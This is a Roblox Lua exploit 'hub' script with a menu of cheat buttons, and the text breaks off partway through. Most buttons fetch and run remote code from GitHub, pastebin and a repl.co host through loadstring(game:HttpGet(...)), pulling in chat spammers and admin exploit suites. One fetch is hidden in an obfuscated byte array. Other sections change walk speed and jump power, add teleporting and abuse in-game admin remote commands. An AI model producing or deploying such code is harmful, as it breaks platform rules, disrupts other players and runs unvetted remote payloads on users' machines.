local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Knogs Osama Hub", "BloodTheme")
local function callback(Text)
 if Text == "Button1 text" then
  print ("thanks!")
elseif Text == ("Button2 text") then
 print ("bnork")
 end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--starter
game.StarterGui:SetCore("SendNotification",  {
 Title = "nort , welcome";
 Text = "don' forget to join our discord made by theshadow24124,oudgsds";
 Icon = "rbxthumb://type=Asset&id=12070397812&w=150&h=150";
 Duration = 22;
 Button1 = "thanks!";
 Button2 = "bnork";
 Callback = NotificationBindable;
})
--
local HomeTab = Window:NewTab("Home")
local scriptsadminTap = Window:NewTab("scriptsadmin")
local CheemsWareTap = Window:NewTab("CheemsWare")
local HatHubTap = Window:NewTab("HatHub")
local ssxTap = Window:NewTab("ssx")
local ScriptFETab = Window:NewTab("ScriptFE")
local FlagsTap = Window:NewTab("Flags")
local madebyTab = Window:NewTab("made by/misc")
local SCRIPTSMAPTab = Window:NewTab("SCRIPTS MAP")

local Section = HomeTab:NewSection("welcome to my script")

Section:NewButton("spam chat", "FE SPAM CHAT", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ant-7802/--/main/straightmilk.lua'))()
end)
Section:NewButton("RTX", "WAIT 5 SECONDS TO LOAD", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/Bkf0BJb3'))()
end)
Section:NewButton("AntiAfk", "AntiAFK can't give you kick", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
end)
Section:NewButton("KEYBOARD ONLY FOR MOBILE", "ONLY FOR MOBILE!", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)
Section:NewButton("r6", "needs admin!", function()
        local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section:NewButton("refresh", "needs admin!", function()
        local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section:NewButton("KEYBOARD V2 ONLY FOR MOBILE", "V2 ONLY FOR MOBILE!", function()
SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
end)
Section:NewButton("AUTOCLICKER USE ONLY PC", "AUTOCLICKER USE ON PC ONLY", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/JustEzpi/ROBLOX-Scripts/main/ROBLOX_AutoClicker"))()
end)
Section:NewButton("AUTOREJOIN COMING SOON!", "AUTOREJOIN COMING SOON", function()
    
end)
Section:NewButton("teleport key works on pc and laptop", "use ctrl + mouse cross", function()
    local Plr = game:GetService("Players").LocalPlayer
local Mouse = Plr:GetMouse()
 
Mouse.Button1Down:connect(function()
if not game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl) then return end
if not Mouse.Target then return end
Plr.Character:MoveTo(Mouse.Hit.p)
end)
end)
Section:NewSlider("Walk Speed", "Set Your Walk Speed", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewSlider("Jump Power", "Set Your Jump Power", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)
Section:NewToggle("Infinite Jump", "Lets you infinitely jump", function()
        local InfiniteJumpEnabled = true
        game:GetService("UserInputService").JumpRequest:connect(function()
            if InfiniteJumpEnabled then
                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
            end
        end)
    end)
Section:NewToggle("coming soon", "coming soon", function()
    
    end)
Section:NewDropdown("coming soon!", "coming soon!", {"kick", "kill", "protect", "...."}, function(currentOption)
    --text here...
end)
Section:NewDropdown("coming soon!", "coming soon!", {"....", "....", "....", "...."}, function(currentOption)
    --text here...
end)
Section:NewDropdown("coming soon!", "coming soon!", {"....", "....", "....", "...."}, function(currentOption)
    --text here...
end)
Section:NewDropdown("coming soon!", "coming soon!", {"....", "....", "....", "...."}, function(currentOption)
    --text here...
end)
Section:NewKeybind("HIDE GUI", "HIDE GUI YOU CAN EDIT IT!", Enum.KeyCode.P, function()
	Library:ToggleUI()
end)
local oldList = {
  "2019",
  "2020"
}
local newList = {
  "2021",
  "2022"
}
local dropdown = Section:NewDropdown("Dropdown","Info", oldList, function()

end)
Section:NewButton("update *don't press many it lags", "Refreshes Dropdown", function()
  dropdown:Refresh(newList)
end)

local Section1 = scriptsadminTap:NewSection("scripts admin & more!")

Section1:NewButton("Homebrew", "normal admin", function()
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
end)
Section1:NewButton("Infinite yield", "better admin", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
Section1:NewButton("fate admin", "strong", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end)
Section1:NewButton("R15 EMOTES", "R15 EMOTES", function()
    local animations = {
    ["Dophin Dance"] = 5918726674,
    ["Applaud"] = 5915693819,
    ["Country Line  Dance"] = 5915712534,
    ["Floss  Dance"] = 5917459365,
    ["Panini Dance"] = 5915713518,
    ["Rock On"] = 5915714366,
    ["Rodeo Dance"] = 5918728267,
    ["Break Dance"] = 5915648917,
    ["High Wave"] = 5915690960,
    ["Holiday Dance"] = 5937558680,
    ["Old Town Road Dance"] = 5937560570,
	["Around Town"] = 3303391864,
	["Top Rock"] = 3361276673,
	["Fashionable"] = 3333331310,
	["Robot"] = 3338025566,
	["Twirl"] = 3334968680,
	["Jacks"] = 3338066331,
	["T"] = 3338010159,
	["Shy"] = 3337978742,
	["Monkey"] = 3333499508,
	["Borock's Rage"] = 3236842542,
	["Ud'zal's Summoning"] = 3303161675,
	["Hype Dance"] = 3695333486,
	["Godlike"] = 3337994105,
	["Swoosh"] = 3361481910,
	["Sneaky"] = 3334424322,
	["Side to Side"] = 3333136415,
	["Greatest"] = 3338042785,
	["Louder"] = 3338083565,
	["Beckon"] = 5230598276,
	["Bored"] = 5230599789,
	["Cower"] = 4940563117,
	["Tantrum"] = 5104341999,
	["Hero Landing"] = 5104344710,
	["Confused"] = 4940561610,
	["Jumping Wave"] = 4940564896,
	["Keeping Time"] = 4555808220,
	["Agree"] = 4841397952,
	["Power Blast"] = 4841403964,
	["Disagree"] = 4841401869,
	["Sleep"] = 4686925579,
	["Sad"] = 4841407203,
	["Happy"] = 4841405708,
	["Chicken Dance"] = 4841399916,
	["Bunny Hop"] = 4641985101,
	["Air Dance"] = 4555782893,
	["Curtsy"] = 4555816777,
	["Zombie"] = 4210116953,
	["Fast Hands"] = 4265701731,
	["Baby Dance"] = 4265725525,
	["Celebrate"] = 3338097973,
	["Fancy Feet"] = 3333432454,
	["Y"] = 4349285876,
	["Shuffle"] = 4349242221,
	["Bodybuilder"] = 3333387824,
	["Sandwich Dance"] = 4406555273,
	["Dorky Dance"] = 4212455378,
	["Heisman Pose"] = 3695263073,
	["Superhero Reveal"] = 3695373233,
	["Dizzy"] = 3361426436,
	["Get Out"] = 3333272779,
	["Fishing"] = 3334832150,
	["Tree"] = 4049551434,
	["Line Dance"] = 4049037604,
	["Idol"] = 4101966434,
	["Haha"] = 3337966527,
	["Salute"] = 3333474484,
	["Hello"] = 3344650532,
	["Air Guitar"] = 3695300085,
	["Cha Cha"] = 3695322025,
	["Shrug"] = 3334392772,
	["Point2"] = 3344585679,
	["Tilt"] = 3334538554,
	["Stadium"] = 3338055167
}

local plr = game.Players.LocalPlayer
local LoganWS = Instance.new('Folder', game)
LoganWS.Name = 'LoganWS'

local buttonHolder = Instance.new('Folder', LoganWS)
buttonHolder.Name = "Buttons"


local Animations = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local Title = Instance.new("TextLabel")
local SearchBox = Instance.new("TextBox")
local Container = Instance.new("ScrollingFrame")
local Button = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
local UIListLayout2 = Instance.new("UIListLayout")
local UIListLayout3 = Instance.new("UIListLayout")
local StopAnim = Instance.new("TextButton")
local PauseAnim = Instance.new("TextButton")
local ReplayAnim = Instance.new("TextButton")
local ReverseAnim = Instance.new("TextButton")
local Exit = Instance.new("TextButton")
local Mini = Instance.new("TextButton")
local titleFrame = Instance.new("Frame")
local slideFrame = Instance.new("Frame")
local SlideBar = Instance.new("Frame")
local SlideButton = Instance.new("TextButton")
local creds = Instance.new("TextLabel")

Animations.Name = "Animations"
Animations.Parent = plr:WaitForChild("PlayerGui")

MainFrame.Name = "MainFrame"
MainFrame.Parent = Animations
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BorderColor3 = Color3.fromRGB(27, 42, 53)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.4, 0, 0.2, 0)
MainFrame.Size = UDim2.new(0.135, 0, 0.6, 0)

titleFrame.Name = "TitleFrame"
titleFrame.Parent = MainFrame
titleFrame.BorderSizePixel = 0
titleFrame.LayoutOrder = 0
titleFrame.BackgroundTransparency = 1
titleFrame.Size = UDim2.new(1, 0, 0.05, 0)

slideFrame.Name = "SlideFrame"
slideFrame.Parent = MainFrame
slideFrame.BorderSizePixel = 0
slideFrame.LayoutOrder = 3
slideFrame.BackgroundTransparency = 1
slideFrame.Size = UDim2.new(1, 0, 0.05, 0)

UIListLayout3.Parent = titleFrame
UIListLayout3.FillDirection = Enum.FillDirection.Horizontal
UIListLayout3.SortOrder = Enum.SortOrder.LayoutOrder

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(102, 45, 113)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(197, 66, 110))}
UIGradient.Parent = MainFrame

Title.Name = "Title"
Title.Parent = titleFrame
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Size = UDim2.new(0.8, 0, 1, 0)
Title.Font = Enum.Font.GothamSemibold
Title.Text = "Emotes"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 14.000
Title.TextWrapped = true
Title.LayoutOrder = 0

creds.Name = "Creds"
creds.Parent = MainFrame
creds.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
creds.BackgroundTransparency = 1.000
creds.Size = UDim2.new(1, 0, 0.05, 0)
creds.Font = Enum.Font.GothamSemibold
creds.Text = "By LoganRMX and Maku"
creds.TextColor3 = Color3.fromRGB(255, 255, 255)
creds.TextScaled = true
creds.TextSize = 14.000
creds.TextWrapped = true
creds.LayoutOrder = 8

SearchBox.Name = "SearchBox"
SearchBox.Parent = MainFrame
SearchBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SearchBox.BackgroundTransparency = 0.750
SearchBox.BorderSizePixel = 0
SearchBox.Size = UDim2.new(1, 0, 0.045, 0)
SearchBox.Font = Enum.Font.GothamSemibold
SearchBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
SearchBox.PlaceholderText = "Search bar..."
SearchBox.Text = ""
SearchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
SearchBox.TextScaled = true
SearchBox.TextSize = 14.000
SearchBox.TextWrapped = true
SearchBox.LayoutOrder = 1

Container.Name = "Container"
Container.Parent = MainFrame
Container.Active = true
Container.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Container.BackgroundTransparency = 0.750
Container.BorderSizePixel = 0
Container.Size = UDim2.new(1, 0, 0.5, 0)
Container.ScrollBarThickness = 5
Container.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left
Container.LayoutOrder = 2

Button.Name = "Button"
Button.Parent = LoganWS
Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Button.BackgroundTransparency = 0.850
Button.BorderSizePixel = 0
Button.Size = UDim2.new(1, 0, 0, 38)
Button.Font = Enum.Font.GothamSemibold
Button.Text = "Test"
Button.TextColor3 = Color3.fromRGB(255, 255, 255)
Button.TextScaled = true
Button.TextSize = 14.000
Button.TextWrapped = true

UIListLayout.Parent = Container
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 5)

UIListLayout2.Parent = MainFrame
UIListLayout2.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout2.Padding = UDim.new(0, 5)

ReverseAnim.Name = "ReverseAnim"
ReverseAnim.Parent = MainFrame
ReverseAnim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReverseAnim.BackgroundTransparency = 0.750
ReverseAnim.BorderColor3 = Color3.fromRGB(27, 42, 53)
ReverseAnim.BorderSizePixel = 0
ReverseAnim.LayoutOrder = 4
ReverseAnim.Size = UDim2.new(0.85, 0, 0.06, 0)
ReverseAnim.Font = Enum.Font.GothamSemibold
ReverseAnim.Text = "Reverse animation"
ReverseAnim.TextColor3 = Color3.fromRGB(255, 255, 255)
ReverseAnim.TextScaled = true
ReverseAnim.TextSize = 14.000
ReverseAnim.TextWrapped = true

StopAnim.Name = "StopAnim"
StopAnim.Parent = MainFrame
StopAnim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
StopAnim.BackgroundTransparency = 0.750
StopAnim.BorderColor3 = Color3.fromRGB(27, 42, 53)
StopAnim.BorderSizePixel = 0
StopAnim.LayoutOrder = 5
StopAnim.Size = UDim2.new(0.85, 0, 0.06, 0)
StopAnim.Font = Enum.Font.GothamSemibold
StopAnim.Text = "Stop animation"
StopAnim.TextColor3 = Color3.fromRGB(255, 255, 255)
StopAnim.TextScaled = true
StopAnim.TextSize = 14.000
StopAnim.TextWrapped = true

PauseAnim.Name = "PauseAnim"
PauseAnim.Parent = MainFrame
PauseAnim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
PauseAnim.BackgroundTransparency = 0.750
PauseAnim.BorderColor3 = Color3.fromRGB(27, 42, 53)
PauseAnim.BorderSizePixel = 0
PauseAnim.Size = UDim2.new(0, 219, 0, 28)
PauseAnim.Font = Enum.Font.GothamSemibold
PauseAnim.Text = "Pause Game Animations"
PauseAnim.TextColor3 = Color3.fromRGB(255, 255, 255)
PauseAnim.TextScaled = true
PauseAnim.TextSize = 14.000
PauseAnim.TextWrapped = true
PauseAnim.LayoutOrder = 6

ReplayAnim.Name = "ReplayAnim"
ReplayAnim.Parent = MainFrame
ReplayAnim.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ReplayAnim.BackgroundTransparency = 0.750
ReplayAnim.BorderColor3 = Color3.fromRGB(27, 42, 53)
ReplayAnim.BorderSizePixel = 0
ReplayAnim.Size = UDim2.new(0, 219, 0, 28)
ReplayAnim.Font = Enum.Font.GothamSemibold
ReplayAnim.Text = "Replay Game Animations"
ReplayAnim.TextColor3 = Color3.fromRGB(255, 255, 255)
ReplayAnim.TextScaled = true
ReplayAnim.TextSize = 14.000
ReplayAnim.TextWrapped = true
ReplayAnim.LayoutOrder = 7

Exit.Name = "Exit"
Exit.Parent = titleFrame
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Size = UDim2.new(0.1, 0, 0.7, 0)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "X"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true
Exit.LayoutOrder = 2

Mini.Name = "Mini"
Mini.Parent = titleFrame
Mini.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Mini.BackgroundTransparency = 1.000
Mini.Size = UDim2.new(0.1, 0, 0.7, 0)
Mini.Font = Enum.Font.GothamSemibold
Mini.Text = "-"
Mini.TextColor3 = Color3.fromRGB(255, 255, 255)
Mini.TextScaled = true
Mini.TextSize = 14.000
Mini.TextWrapped = true
Mini.LayoutOrder = 1

SlideBar.Name = "SlideBar"
SlideBar.Parent = slideFrame
SlideBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SlideBar.BackgroundTransparency = 0.750
SlideBar.BorderSizePixel = 0
SlideBar.Size = UDim2.new(1, 0, 0.3, 0)
SlideBar.AnchorPoint = Vector2.new(0.5,0.5)
SlideBar.Position = UDim2.new(0.5,0,0.5,0)


SlideButton.Name = "SlideButton"
SlideButton.Parent = SlideBar
SlideButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SlideButton.BorderSizePixel = 0
SlideButton.Position = UDim2.new(0.5, 0, -1.5, 0)
SlideButton.Size = UDim2.new(0, 10, 0, 26)
SlideButton.Font = Enum.Font.SourceSans
SlideButton.TextColor3 = Color3.fromRGB(0, 0, 0)
SlideButton.TextSize = 14.000
SlideButton.TextTransparency = 1.000

MainFrame.Active = true
MainFrame.Draggable = true

local LayOut = 0
local CurrentAni = nil
local neg = false


function StopAnims()
	for _,v in pairs(animations) do
		v:Stop()
	end
end

function LoadAnims()
	for i,v in pairs(animations) do
		local Anim = Instance.new("Animation", LoganWS)
		Anim.AnimationId = "rbxassetid://"..v
		animations[i] = plr.Character.Humanoid:LoadAnimation(Anim)
		CreateButton(i)
	end
end

function Snap(number, factor)
	if factor == 0 then
		return number
	else
		return math.floor(number/factor+0.5)*factor
	end
end

function AutoScale()
	local number = (#Container:GetChildren()-1)*38
	number = number + (#Container:GetChildren()-1)*5
	Container.CanvasSize = UDim2.new(0,0,0,number)
end



function CreateButton(AnimationName)
	local ButtonClone = Button:Clone()
	ButtonClone.LayoutOrder = LayOut
	LayOut = LayOut + 1
	ButtonClone.Parent = buttonHolder
	ButtonClone.Name = AnimationName
	ButtonClone.Text = AnimationName
	ButtonClone.MouseButton1Click:Connect(function()
		StopAnims()
		CurrentAni = animations[ButtonClone.Name]
		CurrentAni:Play()
	end)
end

function FindAnim() 
	local text = string.lower(SearchBox.Text)
	if SearchBox.Text == "" or SearchBox.Text == nil then
		for _,v in pairs(buttonHolder:GetChildren()) do
			v.Parent = Container
		end
	else
		for i,v in pairs(buttonHolder:GetChildren()) do
			if string.find(string.lower(v.Name), text) then
				v.Parent = Container
			end
		end
		for i,v in pairs(Container:GetChildren()) do
			if not string.find(string.lower(v.Name), text) and v.Name ~= "UIListLayout" then
				v.Parent = buttonHolder
			end
		end
	end
end

ReverseAnim.MouseButton1Click:Connect(function()
	neg = not neg
end)
StopAnim.MouseButton1Click:Connect(StopAnims)
PauseAnim.MouseButton1Click:Connect(function()
	plr.Character.Animate.Disabled = true
end)
ReplayAnim.MouseButton1Click:Connect(function()
	plr.Character.Animate.Disabled = false
end)

local TS = game:GetService("TweenService")
local tweenclose = TS:Create(MainFrame, TweenInfo.new(1), {Size = UDim2.new(0.135, 0, 0.03, 0)})
local tweenclose2 = TS:Create(titleFrame, TweenInfo.new(1), {Size = UDim2.new(1, 0, 1, 0)})
local tweenopen = TS:Create(MainFrame, TweenInfo.new(1), {Size = UDim2.new(0.135, 0, 0.6, 0)})
local tweenopen2 = TS:Create(titleFrame, TweenInfo.new(1), {Size = UDim2.new(1, 0, 0.05, 0)})
local open = true
Mini.MouseButton1Click:Connect(function()
	if open then
		Mini.Text = "o"
		for _,v in pairs(MainFrame:GetChildren()) do
			if v.Name ~= titleFrame.Name and not string.find(v.Name, "UI") then
				v.Visible = false
			end
		end
		tweenclose:Play()
		tweenclose2:Play()
	else
		Mini.Text = "-"
		for _,v in pairs(MainFrame:GetChildren()) do
			if not string.find(v.Name, "UI") then
				v.Visible = true
			end
		end
		tweenopen:Play()
		tweenopen2:Play()
	end
	open = not open
end)

LoadAnims()



local held = false
SlideButtonPos = SlideButton.Position
local UIS = game:GetService("UserInputService")
local RuS = game:GetService("RunService")
local step = 0.01
local percentage = 0

UIS.InputEnded:connect(function(input, processed)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		held = false
	end
end)

SlideButton.MouseButton1Down:Connect(function()
	held = true
end)

local con = RuS.RenderStepped:connect(function()
	if held then
		local MousePos = UIS:GetMouseLocation().X
		local BtnPos = SlideButton.Position
		local SliderSize = SlideBar.AbsoluteSize.X
		local SliderPos = SlideBar.AbsolutePosition.X
		local pos = Snap((MousePos-SliderPos)/SliderSize,step)
		percentage = math.clamp(pos,0,0.96)
		SlideButton.Position = UDim2.new(percentage,0,BtnPos.Y.Scale, BtnPos.Y.Offset)
	end
	local axis = SlideButton.Position.X.Scale*2
	if neg then
		axis = -axis
	end
	if CurrentAni ~= nil then
		CurrentAni:AdjustSpeed(axis)
	end
	FindAnim()
	AutoScale()
end)

Exit.MouseButton1Click:Connect(function()
	StopAnims()
	plr.Character.Animate.Disabled = false
	Animations:Destroy()
	LoganWS:Destroy()
	con:Disconnect()
end)
end)
local Section2 = scriptsadminTap:NewSection("antibang")

Section2:NewButton("Kill use fate admin and cmd kill player", "use kill to fate admin and cmd kill player", function()
    
end)

Section2:NewButton("Kill all use fate admin and cmd kill player", "use kill all to fate admin and cmd kill player", function()
    
end)

local Section3 = CheemsWareTap:NewSection("Cheemv3")

Section3:NewButton("Cheemv3 script when you press wait 5 sec", "cheem script needed hats with wait", function()
    loadstring(game:HttpGet("https://nexo.notxeneon15.repl.co/cheemsware.lua"))()
end)

local Section4 = CheemsWareTap:NewSection("hats needed cheemv3")

Section4:NewButton("r6", "needs admin!", function()
        local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section4:NewButton("refresh", "needs admin!", function()
        local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section4:NewButton("Fake VR Hands if doesn't work respawn", "wait until 6 seconds", function()
    local A_1 = ";morph me DonaldTrump "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.52)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.56)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.59)
    local A_1 = ";hat me 5674297809"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.63)
    local A_1 = ";hat me 4315489767"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.66)
    local A_1 = ";hat me 4506945409"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.68)
    local A_1 = ";hat me 4753437569"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
    local A_1 = ";hat me 48474313"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.73)
    local A_1 = ";hat me 62234425"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.76)
    local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.79)
    local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.84)
    local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.88)
    local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.91)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section4:NewButton("Hands *it takes many time! for hats", "if doesn't work respawn and wait 50 or tell us dis", function()
    local A_1 = ";morph me d"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.55)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.58)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.62)
    local A_1 = ";hat me 63690008"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.72)
    local A_1 = ";hat me 4504231783"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
    local A_1 = ";hat me 376527115"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(4)
    local A_1 = ";hat me 1103003368"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(6)
    local A_1 = ";hat me 48474294"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(8)
    local A_1 = ";hat me 451220849"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(10)
    local A_1 = ";hat me 62724852"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(12)
    local A_1 = ";hat me 4506945409"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(14)
    local A_1 = ";hat me 6746520818"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(16)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section4:NewButton("Monke", "wait some seconds ", function()
    local A_1 = ";morph me DonaldTrump "
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.51)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.57)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.62)
    local A_1 = ";hat me 7436333515"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.64)
    local A_1 = ";hat me 1744235800"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.67)
    local A_1 = ";hat me 1743941933"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
    local A_1 = ";hat me 4878136110"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.73)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section4:NewButton("Among us", "wait some sec if dosent work respawn and wait 5", function()
    local A_1 = ";morph me D"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.56)
    local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.60)
    local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.64)
    local A_1 = ";hat me 6473546459"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.67)
    local A_1 = ";hat me 11679229"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.70)
    local A_1 = ";hat me 11142504"
